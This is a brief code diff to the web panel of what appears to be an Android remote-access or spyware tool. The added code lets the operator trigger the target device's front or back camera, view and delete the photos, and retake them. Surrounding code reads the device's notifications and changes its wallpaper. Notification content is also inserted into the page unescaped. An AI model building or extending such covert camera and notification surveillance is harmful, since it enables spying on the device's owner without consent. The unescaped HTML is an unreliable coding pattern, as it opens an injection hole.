@@ -177,6 +177,15 @@
                 f.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY URL</button>`;
             } else if(curMod === 'notifications') {
                 b.innerHTML = `<table><tr><th>App</th><th>Message</th></tr>${d.notifications.map(n=>`<tr><td>${n.packageName}</td><td>${n.title}: ${n.text}</td></tr>`).join('')}</table>`;
+            } else if(curMod === 'takebackpic' || curMod === 'takefrontpic') {
+                const m = d.media;
+                if (m && m.last_img) {
+                    b.innerHTML = `<img src="/captured_images/${m.last_img}" style="width:100%; border-radius:15px;">`;
+                    f.innerHTML = `<button onclick="delFile('${m.last_img}')" class="red-btn">DELETE</button>`;
+                } else {
+                    b.innerHTML = `<p style="text-align:center; padding:40px; color:var(--dim);">Taking picture... please wait.</p>`;
+                }
+                f.innerHTML += `<button onclick="cmd('${curMod}')">TAKE NEW PICTURE</button>`;
             }
         }
 
